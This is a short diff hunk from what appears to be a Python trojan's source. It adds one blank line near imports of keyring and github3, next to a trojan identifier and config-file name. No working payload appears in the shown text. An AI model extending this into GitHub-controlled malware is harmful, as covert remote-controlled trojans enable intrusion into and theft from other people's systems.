@@ -11,6 +11,7 @@ import keyring
 
 from github3 import login
 
+
 trojan_id = "number9"
 
 trojan_config = "%s.json" % trojan_id
